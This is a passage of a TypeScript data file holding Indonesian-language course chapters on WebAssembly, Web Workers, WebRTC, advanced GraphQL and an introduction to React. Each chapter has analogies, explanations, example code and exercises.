wasm-pack\\n```\", codeExample: { language: \"rust\", code: \"// Cargo.toml\\n[package]\\nname = \\\"wasm-calc\\\"\\nversion = \\\"0.1.0\\\"\\nedition = \\\"2021\\\"\\n\\n[lib]\\ncrate-type = [\\\"cdylib\\\"]\\n\\n[dependencies]\\nwasm-bindgen = \\\"0.2\\\"\\n\\n// src/lib.rs\\nuse wasm_bindgen::prelude::*;\\n\\n#[wasm_bindgen]\\npub fn add(a: i32, b: i32) -> i32 {\\n    a + b\\n}\\n\\n#[wasm_bindgen]\\npub struct Point {\\n    x: f64,\\n    y: f64,\\n}\\n\\n#[wasm_bindgen]\\nimpl Point {\\n    #[wasm_bindgen(constructor)]\\n    pub fn new(x: f64, y: f64) -> Point {\\n        Point { x, y }\\n    }\\n    \\n    pub fn distance_from_origin(&self) -> f64 {\\n        (self.x.powi(2) + self.y.powi(2)).sqrt()\\n    }\\n}\\n\\n// Build\\n// wasm-pack build --target web\" }, explainAlong: \"Baris 1-8: Cargo.toml config. Baris 10-25: Rust code dengan wasm_bindgen. Baris 28: Build command.\", aiPrompt: \"Jelaskan kenapa Rust cocok untuk WASM.\", reflection: \"Install Rust dan wasm-pack. Tulis fungsi Fibonacci, compile ke WASM, panggil dari JS.\" },\n  { id: \"13.3\", moduleId: 13, chapterNum: \"13.3\", title: \"Komputasi Performa Tinggi di Browser\", subtitle: \"WebGL, WebGPU, dan parallel processing\", level: \"Lanjut\", objectives: [\"Memahami WebGL dan WebGPU\", \"Bisa menggunakan Web Workers untuk parallel processing\"], analogy: { diagram: \"CPU = 1 Tukang Ahli (bisa apa saja, 1 per satu)\\nGPU = 1000 Tukang Sederhana (banyak, paralel)\\n\\nWebGL/WebGPU = Manfaatkan GPU untuk grafis dan compute\", caption: \"GPU excels di parallel computation — ideal untuk grafis dan simulasi\" }, explanation: \"**WebGL** dan **WebGPU** adalah API untuk akses GPU dari browser.\n\nMereka memungkinkan grafis 3D dan komputasi paralel yang sangat cepat.\\n\\n**WebGL** → Based on OpenGL ES 3.0.\n\nSudah widely supported.\\n**WebGPU** → Next-gen, based on Vulkan/D3D12/Metal.\n\nLebih performant, lebih fleksibel.\\n\\n**Web Workers** → JavaScript multi-threading.\\n- Main thread tidak blocking.\\n- Ideal untuk heavy computation.\\n- Tidak bisa akses DOM (communicate via message passing).\\n\\n**Use Cases:**\\n- Game engines (Three.js,\n\nBabylon.js).\\n- Video processing, image filters.\\n- Machine learning inference (TensorFlow.js).\\n- Physics simulation.\", codeExample: { language: \"javascript\", code: \"// WEB WORKER\\n// worker.js\\nself.onmessage = (event) => {\\n  const { numbers } = event.data;\\n  const result = numbers.map(n => heavyCalculation(n));\\n  self.postMessage(result);\\n};\\n\\nfunction heavyCalculation(n) {\\n  // Simulate CPU-intensive work\\n  let sum = 0;\\n  for (let i = 0; i < 1000000; i++) {\\n    sum += Math.sqrt(n + i);\\n  }\\n  return sum;\\n}\\n\\n// main.js\\nconst worker = new Worker('worker.js');\\nworker.postMessage({ numbers: [1, 2, 3, 4, 5] });\\nworker.onmessage = (event) => {\\n  console.log('Results:', event.data);\\n};\\n\\n// WEBGPU COMPUTE SHADER\\nconst adapter = await navigator.gpu.requestAdapter();\\nconst device = await adapter.requestDevice();\\n\\n// Create buffer and run compute shader\\n// Ideal for: matrix multiplication, neural network inference\\n// See: https://webgpu.io\" }, explainAlong: \"Baris 2-12: Web Worker. Baris 15-19: Main thread komunikasi dengan worker. Baris 22-25: WebGPU setup.\", aiPrompt: \"Jelaskan bedanya WebGL dan WebGPU.\", reflection: \"Buat Web Worker yang menghitung prime numbers. Bandingkan performa dengan main thread.\" },\n  { id: \"13.4\", moduleId: 13, chapterNum: \"13.4\", title: \"Integrasi WASM dengan Ekosistem JS\", subtitle: \"npm publish, bundler integration, dan debugging\", level: \"Lanjut\", objectives: [\"Memahami cara publish WASM package\", \"Bisa mengintegrasikan WASM dengan Vite/Webpack\"], analogy: { diagram: \"WASM = Engine Mobil\\nJS = Bodi dan Dashboard\\nBundler = Pabrik Perakitan\\n\\n[Engine] + [Bodi] → [Pabrik] → [Mobil jadi]\\n[WASM] + [JS]    → [Vite]   → [Bundle]\", caption: \"WASM diintegrasikan ke dalam build pipeline JavaScript\" }, explanation: \"**Integrasi WASM dengan JS Ecosystem:**\\n\\n**1. Publish ke npm**\\nwasm-pack bisa publish langsung ke npm. Package bisa di-import seperti package JS biasa.\\n\\n**2. Bundler Integration**\\n- **Vite** → Native ESM support, WASM import built-in.\\n- **Webpack** → Perlu wasm-loader.\\n- **Rollup** → Perlu plugin.\\n\\n**3. Debugging**\\n- Chrome DevTools → Support WASM debugging.\\n- Source maps → Map WASM code ke source Rust/C++.\\n\\n**Best Practices:**\\n- Lazy-load WASM modules (jangan blocking initial load).\\n- Gunakan streaming instantiation.\\n- Handle errors gracefully.\", codeExample: { language: \"javascript\", code: \"// VITE + WASM\\n// Lazy load WASM module\\nasync function initImageProcessor() {\\n  const { process_image } = await import('../wasm/pkg');\\n  return process_image;\\n}\\n\\n// STREAMING INSTANTIATION (lebih cepat)\\nasync function loadWasmStreaming() {\\n  const { instance } = await WebAssembly.instantiateStreaming(\\n    fetch('optimized.wasm'),\\n    importObject\\n  );\\n  return instance.exports;\\n}\\n\\n// NPM PUBLISH\\n// wasm-pack build --target bundler\\n// cd pkg && npm publish\\n\\n// USAGE SETELAH PUBLISH\\nimport { init, classify_image } from 'my-wasm-classifier';\\n\\nasync function classify(file) {\\n  await init(); // Initialize WASM module\\n  const result = classify_image(file);\\n  return result;\\n}\\n\\n// ERROR HANDLING\\ntry {\\n  const result = riskyWasmOperation();\\n} catch (e) {\\n  if (e instanceof WebAssembly.RuntimeError) {\\n    console.error('WASM error:', e);\\n  }\\n}\" }, explainAlong: \"Baris 2-6: Lazy load. Baris 9-13: Streaming instantiation. Baris 16-18: Publish ke npm. Baris 21-27: Usage. Baris 30-35: Error handling.\", aiPrompt: \"Jelaskan kenapa streaming instantiation lebih cepat.\", reflection: \"Publish WASM package ke npm. Install dan gunakan di project JS.\" },\n];\n\n// ============================================================\n// MODUL 14: Real-time & WebRTC (4 chapters)\n// ============================================================\nconst modul14: Chapter[] = [\n  { id: \"14.1\", moduleId: 14, chapterNum: \"14.1\", title: \"WebRTC: Video Call Langsung di Browser\", subtitle: \"Peer-to-peer connection, getUserMedia, dan RTCPeerConnection\", level: \"Lanjut\", objectives: [\"Memahami konsep WebRTC\", \"Bisa membuat video call sederhana\"], analogy: { diagram: \"WebRTC = Telepon Langsung Antar Browser:\\n\\n[Browser A] ←→ [Browser B]\\n   (P2P — tidak lewat server!)\\n\\nServer hanya untuk 'perkenalan' (signaling)\", caption: \"WebRTC enables peer-to-peer communication di browser\" }, explanation: \"**WebRTC (Web Real-Time Communication)** adalah teknologi yang memungkinkan browser berkomunikasi secara real-time: video call, voice call, dan data transfer — **tanpa plugin** dan **peer-to-peer** (langsung antar browser).\\n\\n**Komponen WebRTC:**\\n1. **getUserMedia** → Akses kamera dan microphone.\\n2. **RTCPeerConnection** → Koneksi P2P antara peers.\\n3. **RTCDataChannel** → Kirim data arbitrary (file, text).\\n\\n**Cara kerja:**\\n1.\n\n**Signaling** → Server perkenalkan peer A dan B (exchange SDP dan ICE candidates).\\n2. **ICE (Interactive Connectivity Establishment)** → Temukan jalur koneksi terbaik.\\n3. **P2P Connection** → Data mengalir langsung antar browser.\", codeExample: { language: \"javascript\", code: \"// GET USER MEDIA\\nconst stream = await navigator.mediaDevices.getUserMedia({\\n  video: true,\\n  audio: true\\n});\\nlocalVideo.srcObject = stream;\\n\\n// CREATE PEER CONNECTION\\nconst pc = new RTCPeerConnection({\\n  iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]\\n});\\n\\n// Add local stream\\nstream.getTracks().forEach(track => {\\n  pc.addTrack(track, stream);\\n});\\n\\n// Handle remote stream\\npc.ontrack = (event) => {\\n  remoteVideo.srcObject = event.streams[0];\\n};\\n\\n// Handle ICE candidates\\npc.onicecandidate = (event) => {\\n  if (event.candidate) {\\n    signalingServer.send({ type: 'ice', candidate: event.candidate });\\n  }\\n};\\n\\n// CREATE OFFER (caller)\\nconst offer = await pc.createOffer();\\nawait pc.setLocalDescription(offer);\\nsignalingServer.send({ type: 'offer', sdp: offer });\\n\\n// HANDLE ANSWER (callee)\\nsignalingServer.onMessage = async (msg) => {\\n  if (msg.type === 'offer') {\\n    await pc.setRemoteDescription(msg.sdp);\\n    const answer = await pc.createAnswer();\\n    await pc.setLocalDescription(answer);\\n    signalingServer.send({ type: 'answer', sdp: answer });\\n  }\\n};\" }, explainAlong: \"Baris 2-4: Get user media. Baris 7-21: Peer connection setup. Baris 24-27: Create offer. Baris 30-38: Handle answer.\", aiPrompt: \"Jelaskan apa itu STUN dan TURN server.\", reflection: \"Buat aplikasi video call sederhana dengan WebRTC. Test antar dua browser.\" },\n  { id: \"14.2\", moduleId: 14, chapterNum: \"14.2\", title: \"Signaling Server dan STUN/TURN\", subtitle: \"Arsitektur signaling, ICE, dan NAT traversal\", level: \"Lanjut\", objectives: [\"Memahami signaling dan ICE process\", \"Bisa setup STUN/TURN server\"], analogy: { diagram: \"WebRTC Call = Blind Date:\\n\\n[Andi] → 'Mau kenalan?' → [Mak Comblang] → 'Ada yang mau kenalan' → [Budi]\\n  ↓                                                        ↓\\nTuker kontak langsung ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←\\n(P2P — tidak lewat mak comblang lagi)\", caption: \"Signaling hanya untuk perkenalan — setelah itu P2P langsung\" }, explanation: \"**Signaling** adalah proses di mana dua peer saling bertukar informasi untuk establish koneksi.\n\nWebRTC tidak menspesifikasikan signaling protocol — kamu bebas pakai WebSocket, SSE, atau HTTP polling.\\n\\n**ICE (Interactive Connectivity Establishment):**\\nICE adalah framework untuk menemukan jalur koneksi terbaik antara peers.\\n\\n**STUN Server** → Beri tahu peer IP publik mereka (karena biasanya di belakang NAT).\\n\\n**TURN Server** → Relay server untuk fallback kalau P2P langsung tidak bisa (symmetric NAT,\n\nFirewall).\\n\\n**NAT Types:**\\n- **Full Cone** → Mudah P2P.\\n- **Restricted Cone** → Perlu STUN.\\n- **Symmetric** → Perlu TURN (sulit P2P).\", codeExample: { language: \"javascript\", code: \"// SIGNALING SERVER (WebSocket)\\nconst WebSocket = require('ws');\\nconst wss = new WebSocket.Server({ port: 8080 });\\n\\nconst rooms = new Map();\\n\\nwss.on('connection', (ws) => {\\n  ws.on('message', (data) => {\\n    const msg = JSON.parse(data);\\n    \\n    if (msg.type === 'join') {\\n      const room = rooms.get(msg.roomId) || new Set();\\n      room.add(ws);\\n      rooms.set(msg.roomId, room);\\n      ws.roomId = msg.roomId;\\n    }\\n    \\n    // Broadcast ke room (kecuali sender)\\n    if (ws.roomId) {\\n      rooms.get(ws.roomId).forEach(client => {\\n        if (client !== ws && client.readyState === WebSocket.OPEN) {\\n          client.send(JSON.stringify(msg));\\n        }\\n      });\\n    }\\n  });\\n});\\n\\n// TURN SERVER (coturn)\\n// /etc/turnserver.conf\\n// listening-port=3478\\n// fingerprint\\n// use-auth-secret\\n// static-auth-secret=your-secret-key\\n\\n// RTC PEER CONNECTION dengan TURN\\nconst pc = new RTCPeerConnection({\\n  iceServers: [\\n    { urls: 'stun:stun.l.google.com:19302' },\\n    {\\n      urls: 'turn:your-turn-server.com:3478',\\n      username: 'user',\\n      credential: 'pass'\\n    }\\n  ]\\n});\" }, explainAlong: \"Baris 2-26: Signaling server dengan WebSocket. Baris 28-37: TURN server config dan RTC setup.\", aiPrompt: \"Jelaskan kapan STUN tidak cukup dan butuh TURN.\", reflection: \"Setup coturn server. Test WebRTC connection di network berbeda (WiFi vs 4G).\" },\n  { id: \"14.3\", moduleId: 14, chapterNum: \"14.3\", title: \"RTCDataChannel dan File Transfer\", subtitle: \"Transfer data arbitrary, file sharing, dan game networking\", level: \"Lanjut\", objectives: [\"Memahami RTCDataChannel\", \"Bisa membuat file transfer P2P\"], analogy: { diagram: \"Video Track = Jalur Tol Kendaraan\\nAudio Track = Jalur Tol Motor\\nDataChannel = Jalur Tol Truk (bisa apa saja)\\n\\nSemuanya lewat jalur yang sama (RTCPeerConnection)\", caption: \"RTCDataChannel memungkinkan transfer data arbitrary via koneksi WebRTC\" }, explanation: \"**RTCDataChannel** adalah API untuk mengirim data arbitrary (text, file, binary) melalui koneksi WebRTC.\n\nLebih cepat dan reliable daripada WebSocket untuk P2P communication.\\n\\n**Keuntungan DataChannel:**\\n- **Low latency** → P2P,\n\nTidak lewat server.\\n- **Reliable atau unreliable mode** → Pilih sesuai kebutuhan.\\n- **Ordered atau unordered** → Control delivery order.\\n- **End-to-end encryption** → DTLS-encrypted.\\n\\n**Use Cases:**\\n- File sharing P2P.\\n- Game networking (game state sync).\\n- Screen sharing data.\\n- Collaborative editing.\", codeExample: { language: \"javascript\", code: \"// CREATE DATA CHANNEL\\nconst dataChannel = pc.createDataChannel('fileTransfer', {\\n  ordered: true // Guarantee order\\n});\\n\\ndataChannel.onopen = () => {\\n  console.log('Data channel open!');\\n};\\n\\ndataChannel.onmessage = (event) => {\\n  if (typeof event.data === 'string') {\\n    // Metadata\\n    const meta = JSON.parse(event.data);\\n    console.log('Receiving file:', meta.name, meta.size);\\n  } else {\\n    // Binary data\\n    receivedChunks.push(event.data);\\n  }\\n};\\n\\n// SEND FILE\\nasync function sendFile(file) {\\n  // Send metadata\\n  dataChannel.send(JSON.stringify({\\n    name: file.name,\\n    size: file.size,\\n    type: file.type\\n  }));\\n  \\n  // Send file in chunks\\n  const chunkSize = 16384; // 16KB\\n  const buffer = await file.arrayBuffer();\\n  \\n  for (let offset = 0; offset < buffer.byteLength; offset += chunkSize) {\\n    const chunk = buffer.slice(offset, offset + chunkSize);\\n    dataChannel.send(chunk);\\n  }\\n  \\n  dataChannel.send('EOF'); // End of file marker\\n}\\n\\n// RECEIVE FILE\\nconst receivedChunks = [];\\ndataChannel.onmessage = (event) => {\\n  if (event.data === 'EOF') {\\n    const blob = new Blob(receivedChunks);\\n    const url = URL.createObjectURL(blob);\\n    // Create download link\\n    const a = document.createElement('a');\\n    a.href = url;\\n    a.download = receivedFileName;\\n    a.click();\\n  } else {\\n    receivedChunks.push(event.data);\\n  }\\n};\" }, explainAlong: \"Baris 2-6: Create data channel. Baris 15-28: Send file. Baris 31-43: Receive file.\", aiPrompt: \"Jelaskan bedanya reliable dan unreliable mode di DataChannel.\", reflection: \"Buat aplikasi file transfer P2P. Kirim file 10MB. Berapa lama?\" },\n  { id: \"14.4\", moduleId: 14, chapterNum: \"14.4\", title: \"Media Capture dan Screen Sharing\", subtitle: \"getDisplayMedia, picture-in-picture, dan media processing\", level: \"Lanjut\", objectives: [\"Memahami screen sharing API\", \"Bisa mengimplementasikan screen recording\"], analogy: { diagram: \"getUserMedia = Kamera depan (selfie)\\ngetDisplayMedia = Kamera yang menghadap layar\\n\\n[Screen] → [Capture] → [Stream] → [Peer B]\", caption: \"Screen sharing menggunakan getDisplayMedia API\" }, explanation: \"**getDisplayMedia** adalah API untuk capture screen atau window tertentu. Digunakan untuk screen sharing di aplikasi video conference.\\n\\n**API Terkait:**\\n- **getDisplayMedia()** → Capture screen/window/tab.\\n- **Picture-in-Picture** → Tampilkan video di floating window.\\n- **MediaRecorder** → Record stream ke file.\\n\\n**Screen Sharing + Camera:**\\nBisa combine screen track dan camera track ke dalam satu peer connection.\\n\\n**Media Processing:**\\n- Canvas API → Draw frame, apply filters.\\n- Insertable Streams → Process frame before sending (blur background).\", codeExample: { language: \"javascript\", code: \"// SCREEN SHARING\\nasync function startScreenShare() {\\n  const screenStream = await navigator.mediaDevices.getDisplayMedia({\\n    video: { cursor: 'always' },\\n    audio: false\\n  });\\n  \\n  // Replace video track in peer connection\\n  const sender = pc.getSenders().find(s =>\\n    s.track.kind === 'video'\\n  );\\n  sender.replaceTrack(screenStream.getVideoTracks()[0]);\\n  \\n  screenStream.getVideoTracks()[0].onended = () => {\\n    // Switch back to camera when screen share stops\\n    sender.replaceTrack(cameraStream.getVideoTracks()[0]);\\n  };\\n}\\n\\n// PICTURE-IN-PICTURE\\nasync function enablePiP() {\\n  if (document.pictureInPictureEnabled) {\\n    await videoElement.requestPictureInPicture();\\n  }\\n}\\n\\n// RECORD STREAM\\nconst recorder = new MediaRecorder(stream);\\nconst chunks = [];\\n\\nrecorder.ondataavailable = (e) => chunks.push(e.data);\\nrecorder.onstop = () => {\\n  const blob = new Blob(chunks, { type: 'video/webm' });\\n  const url = URL.createObjectURL(blob);\\n  const a = document.createElement('a');\\n  a.href = url;\\n  a.download = 'recording.webm';\\n  a.click();\\n};\\n\\nrecorder.start();\\n// ... later ...\\nrecorder.stop();\" }, explainAlong: \"Baris 2-14: Screen sharing dengan replaceTrack. Baris 17-20: Picture-in-Picture. Baris 23-33: MediaRecorder.\", aiPrompt: \"Jelaskan cara combine screen track dan camera track.\", reflection: \"Buat aplikasi screen recorder. Record 30 detik. Berapa ukuran file-nya?\" },\n];\n\n// ============================================================\n// MODUL 15: GraphQL Advanced (4 chapters)\n// ============================================================\nconst modul15: Chapter[] = [\n  { id: \"15.1\", moduleId: 15, chapterNum: \"15.1\", title: \"Apollo Federation: Microservices GraphQL\", subtitle: \"Subgraph, supergraph, dan gateway\", level: \"Lanjut\", objectives: [\"Memahami konsep Apollo Federation\", \"Bisa membuat subgraph dan supergraph\"], analogy: { diagram: \"Federation = Atlas Terpadu:\\n\\n[Peta Kota A] + [Peta Kota B] + [Peta Kota C]\\n      ↓              ↓              ↓\\n   Subgraph      Subgraph      Subgraph\\n      ↓              ↓              ↓\\n        →→→ [Peta Nasional] ←←←\\n              (Supergraph)\", caption: \"Apollo Federation menggabungkan subgraphs menjadi satu supergraph\" }, explanation: \"**Apollo Federation** memungkinkan beberapa GraphQL services (subgraphs) digabungkan menjadi satu unified API (supergraph) di gateway.\\n\\n**Konsep:**\\n- **Subgraph** → Setiap service punya schema GraphQL sendiri.\\n- **@key directive** → Mendefinisikan primary key entity.\\n- **@extends** → Subgraph bisa extend entity dari subgraph lain.\\n- **Gateway** → Compose subgraphs,\n\nRoute query ke service yang tepat.\\n\\n**Keuntungan:**\\n- Setiap tim own domain-nya.\\n- Independent deployment.\\n- Client lihat satu schema unified.\", codeExample: { language: \"graphql\", code: \"# USER SERVICE (Subgraph)\\ntype User @key(fields: \\\"id\\\") {\\n  id: ID!\\n  name: String!\\n  email: String!\\n}\\n\\n# ORDER SERVICE (Subgraph)\\ntype Order @key(fields: \\\"id\\\") {\\n  id: ID!\\n  userId: ID!\\n  total: Float!\\n}\\n\\ntype User @key(fields: \\\"id\\\") @extends {\\n  id: ID! @external\\n  orders: [Order!]! @requires(fields: \\\"id\\\")\\n}\\n\\n# GATEWAY\\nconst { ApolloGateway, IntrospectAndCompose } = require('@apollo/gateway');\\n\\nconst gateway = new ApolloGateway({\\n  supergraphSdl: new IntrospectAndCompose({\\n    subgraphs: [\\n      { name: 'users', url: 'http://localhost:4001' },\\n      { name: 'orders', url: 'http://localhost:4002' }\\n    ]\\n  })\\n});\\n\\n# CLIENT QUERY\\nquery {\\n  user(id: \\\"1\\\") {\\n    name        # dari User Service\\n    orders {    # dari Order Service\\n      total\\n    }\\n  }\\n}\" }, explainAlong: \"Baris 1-6: User subgraph. Baris 9-18: Order subgraph extends User. Baris 21-31: Gateway compose. Baris 34-42: Cross-service query.\", aiPrompt: \"Jelaskan bedanya schema stitching dan Apollo Federation.\", reflection: \"Setup 2 subgraphs dengan Apollo Federation. Lakukan cross-service query.\" },\n  { id: \"15.2\", moduleId: 15, chapterNum: \"15.2\", title: \"GraphQL Subscriptions: Real-time Data\", subtitle: \"WebSocket transport, pub/sub, dan reactive data\", level: \"Lanjut\", objectives: [\"Memahami GraphQL subscriptions\", \"Bisa mengimplementasikan real-time GraphQL\"], analogy: { diagram: \"Query    = Tanya sekali, jawab sekali\\nMutation = Lakukan sekali, konfirmasi sekali\\nSubscription = 'Beritahu saya kalau ada update'\\n\\n[Client] ←←← [Update!] ←←← [Server]\\n       (streaming real-time)\", caption: \"Subscription memungkinkan real-time data push dari server\" }, explanation: \"**GraphQL Subscriptions** memungkinkan client subscribe ke event dan menerima data real-time dari server. Server push update ke client ketika event terjadi.\\n\\n**Transport:**\\n- **WebSocket** → Transport paling umum (graphql-ws).\\n- **SSE** → Alternative (subscriptions-transport-sse).\\n\\n**Use Cases:**\\n- Chat messages.\\n- Live notifications.\\n- Real-time dashboards.\\n- Stock price updates.\\n\\n**Implementation:**\\nServer menggunakan pub/sub (Redis, Kafka) untuk broadcast events ke subscribers.\", codeExample: { language: \"javascript\", code: \"// SCHEMA\\ntype Subscription {\\n  messageAdded(roomId: ID!): Message!\\n  userTyping(roomId: ID!): User!\\n}\\n\\n// RESOLVER (Apollo Server)\\nconst resolvers = {\\n  Subscription: {\\n    messageAdded: {\\n      subscribe: (_, { roomId }, { pubsub }) =>\\n        pubsub.asyncIterator(`MESSAGE_ADDED_${roomId}`)\\n    },\\n    userTyping: {\\n      subscribe: (_, { roomId }, { pubsub }) =>\\n        pubsub.asyncIterator(`USER_TYPING_${roomId}`)\\n    }\\n  },\\n  Mutation: {\\n    async addMessage(_, { roomId, text }, { pubsub }) {\\n      const message = await db.messages.create({ roomId, text });\\n      pubsub.publish(`MESSAGE_ADDED_${roomId}`, { messageAdded: message });\\n      return message;\\n    }\\n  }\\n};\\n\\n// CLIENT (Apollo Client)\\nconst MESSAGE_ADDED = gql`\\n  subscription MessageAdded($roomId: ID!) {\\n    messageAdded(roomId: $roomId) {\\n      id\\n      text\\n      author { name }\\n    }\\n  }\\n`;\\n\\nfunction ChatRoom({ roomId }) {\\n  const { data } = useSubscription(MESSAGE_ADDED, {\\n    variables: { roomId }\\n  });\\n  \\n  return (\\n    <div>\\n      {data?.messageAdded && (\\n        <Message msg={data.messageAdded} />\\n      )}\\n    </div>\\n  );\\n}\" }, explainAlong: \"Baris 1-5: Schema. Baris 8-22: Resolver dengan pubsub. Baris 24-32: Client subscription.\", aiPrompt: \"Jelaskan bedanya subscriptions dengan polling.\", reflection: \"Implementasi chat real-time dengan GraphQL subscriptions.\" },\n  { id: \"15.3\", moduleId: 15, chapterNum: \"15.3\", title: \"Performance Optimization GraphQL\", subtitle: \"N+1 problem, DataLoader, persisted queries, dan caching\", level: \"Lanjut\", objectives: [\"Memahami N+1 problem dan solusinya\", \"Bisa menggunakan DataLoader\"], analogy: { diagram: \"N+1 Problem = Anak yang Bertanya Terus:\\n\\n[Guru] 'Siapa nama kalian?' (1 query)\\n[Murid 1] 'Budi'    → 'Umur berapa?'  (query ke-2)\\n[Murid 2] 'Ani'     → 'Umur berapa?'  (query ke-3)\\n...\\n100 murid = 101 query!\\n\\nSolusi (DataLoader): 'Tulis semua nama dan umur di papan!'\", caption: \"N+1 problem — batch query untuk efisiensi\" }, explanation: \"**N+1 Problem** adalah masalah performa di GraphQL ketika resolver untuk list of items melakukan query individual untuk setiap item.\\n\\n**Contoh N+1:**\\nQuery: `{ users { name orders { total } } }`\\nTanpa optimasi: 1 query untuk users + N query untuk orders setiap user.\\n\\n**Solusi — DataLoader:**\\nDataLoader batch dan cache query dalam single tick of event loop.\\n\\n**Optimasi Lain:**\\n- **Persisted Queries** → Client kirim hash,\n\nBukan full query.\\n- **Query Complexity Analysis** → Batasi query depth dan complexity.\\n- **Response Caching** → Cache hasil query.\\n- **@cacheControl directive** → Fine-grained caching.\", codeExample: { language: \"javascript\", code: \"// DATALOADER\\nconst DataLoader = require('dataloader');\\n\\n// Batch function\\nconst orderLoader = new DataLoader(async (userIds) => {\\n  // 1 query untuk semua user\\n  const orders = await db.query(\\n    'SELECT * FROM orders WHERE user_id IN (?)',\\n    [userIds]\\n  );\\n  \\n  // Group by user_id\\n  const ordersByUser = {};\\n  orders.forEach(o => {\\n    if (!ordersByUser[o.user_id]) ordersByUser[o.user_id] = [];\\n    ordersByUser[o.user_id].push(o);\\n  });\\n  \\n  return userIds.map(id => ordersByUser[id] || []);\\n});\\n\\n// Resolver\\nconst resolvers = {\\n  User: {\\n    orders: (user) => orderLoader.load(user.id) // Batch otomatis!\\n  }\\n};\\n\\n// PERSISTED QUERIES (Apollo Server)\\nconst { ApolloServer } = require('@apollo/server');\\nconst server = new ApolloServer({\\n  typeDefs,\\n  resolvers,\\n  persistedQueries: {\\n    cache: new KeyvAdapter(new Keyv()),\\n    ttl: 86400 // 24 hours\\n  }\\n});\\n\\n// QUERY COMPLEXITY\\nconst { createComplexityLimitRule } = require('graphql-validation-complexity');\\nconst rule = createComplexityLimitRule(1000);\\n\\n// CACHE CONTROL\\ntype Query @cacheControl(maxAge: 240) {\\n  user(id: ID!): User\\n}\" }, explainAlong: \"Baris 2-17: DataLoader batch function. Baris 20-23: Resolver dengan DataLoader. Baris 26-33: Persisted queries. Baris 36-37: Query complexity.\", aiPrompt: \"Jelaskan kenapa DataLoader hanya cache dalam 1 tick event loop.\", reflection: \"Implementasi DataLoader di GraphQL API-mu. Bandingkan query count sebelum dan sesudah.\" },\n  { id: \"15.4\", moduleId: 15, chapterNum: \"15.4\", title: \"Advanced Schema Design dan Directives\", subtitle: \"Custom directives, schema composition, dan best practices\", level: \"Lanjut\", objectives: [\"Memahami custom directives\", \"Bisa mendesain schema GraphQL yang scalable\"], analogy: { diagram: \"Directives = Stiker Instruksi:\\n\\n@deprecated = Jangan pakai ini lagi\\n@auth       = Butuh login\\n@cacheControl = Bisa disimpan 1 jam\\n\\nCustom directive = Stiker buatan sendiri\", caption: \"Directives adalah instruksi metadata di schema GraphQL\" }, explanation: \"**Directives** adalah instruksi metadata di schema GraphQL. Mereka dimulai dengan @ dan bisa mengubah execution behavior.\\n\\n**Built-in Directives:**\\n- @deprecated(reason: String) → Tandai field yang tidak direkomendasikan.\\n- @skip(if: Boolean) → Skip field conditionally.\\n- @include(if: Boolean) → Include field conditionally.\\n\\n**Custom Directives:**\\n- @auth(requires: Role = ADMIN) → Authorization.\\n- @cacheControl(maxAge: Int) → Caching.\\n- @rateLimit(max: Int, window: String) → Rate limiting.\\n\\n**Schema Best Practices:**\\n1. Pagination → Gunakan Connection pattern (edges, nodes).\\n2. Input Object Types → Untuk mutation arguments.\\n3.\n\nNullability → Non-null untuk required fields.\\n4. Naming → Query (verb), Type (noun), Mutation (verb).\", codeExample: { language: \"javascript\", code: \"// CUSTOM DIRECTIVE\\nconst { mapSchema, getDirective, MapperKind } = require('@graphql-tools/utils');\\n\\nfunction authDirective(directiveName) {\\n  return {\\n    authDirectiveTypeDefs: 'directive @' + directiveName + '(requires: Role = ADMIN) on FIELD_DEFINITION',\\n    authDirectiveTransformer: (schema) => mapSchema(schema, {\\n      [MapperKind.OBJECT_FIELD]: (fieldConfig) => {\\n        const authDirective = getDirective(schema, fieldConfig, directiveName)?.[0];\\n        if (authDirective) {\\n          const { resolve = defaultFieldResolver } = fieldConfig;\\n          fieldConfig.resolve = function (source, args, context, info) {\\n            if (!context.user || context.user.role !== authDirective.requires) {\\n              throw new Error('Unauthorized');\\n            }\\n            return resolve(source, args, context, info);\\n          };\\n          return fieldConfig;\\n        }\\n      }\\n    })\\n  };\\n}\\n\\n// PAGINATION EXAMPLE\\n// type Query { users(first: Int = 10, after: String): UserConnection }\\n// type UserConnection { edges: [UserEdge] pageInfo: PageInfo }\\n// type UserEdge { node: User cursor: String }\\n// type PageInfo { hasNextPage: Boolean endCursor: String }\" }, explainAlong: \"Baris 2-19: Custom auth directive. Baris 22-26: Pagination pattern.\", aiPrompt: \"Jelaskan Connection pattern untuk pagination.\", reflection: \"Refactor schema-mu menggunakan Connection pattern dan custom directives.\" },\n];\n\n// ============================================================\n// Export semua chapters\n// ============================================================\n\nexport function getChapter(moduleId: number, chapterId: string): Chapter | undefined {\n  return chapters.find((c) => c.moduleId === moduleId && c.id === chapterId);\n}\n\nexport function getModuleChapters(moduleId: number): Chapter[] {\n  return chapters.filter((c) => c.moduleId === moduleId);\n}\n\n// ============================================================\n// MODUL 16: FRONTEND MODERN (18 chapters)\n// React, Vite, Tailwind CSS, shadcn/ui, Radix UI\n// ============================================================\n\nconst modul16: Chapter[] = [\n  {\n    id: \"16.1\",\n    moduleId: 16,\n    chapterNum: \"16.1\",\n    title: \"React: Mengapa Kita Butuh Library UI?\",\n    subtitle: \"Dari manipulasi DOM manual ke pendekatan deklaratif\",\n    level: \"Menengah\",\n    objectives: [\n      \"Memahami masalah yang diselesaikan React\",\n      \"Mengerti perbedaan imperatif vs deklaratif\",\n      \"Bisa menjelaskan konsep Virtual DOM\",\n    ],\n    analogy: { diagram: \"Vanilla JS (Imperatif):\\n  document.getElementById('app').innerHTML = '<div>Halo</div>'\\n  (Kamu urus setiap perubahan manual)\\n\\nReact (Deklaratif):\\n  return <div>Halo</div>\\n  (React yang urus render dan update)\", caption: \"React mengubah cara berpikir: dari 'cara melakukan' ke 'apa yang diinginkan'\" },\n    explanation: \"Kalau kamu sudah nyaman dengan HTML, CSS, dan JavaScript dasar, mungkin kamu bertanya-tanya: kenapa sih butuh library kayak React?\n\nBukannya vanilla JS sudah cukup?\\n\\nPertanyaan yang sangat valid!\n\nUntuk website sederhana seperti landing page atau portfolio, vanilla JS memang cukup.\n\nTapi begitu aplikasimu bertambah kompleks — punya banyak halaman, form interaktif, data yang sering berubah — vanilla JS mulai terasa seperti mencoba membangun rumah dengan obeng dan palu saja.\\n\\n**Masalah Utama: DOM Manipulation Berantakan**\\nDi JavaScript vanilla,\n\nSetiap kali data berubah kamu harus manual cari elemen di DOM, ubah isinya, ubah class-nya.\n\nBayangkan aplikasi to-do list: user tambah task baru → kamu harus create element, set text, tambah class, append ke list, update counter. Setiap interaksi butuh 5-10 baris kode. Di aplikasi besar 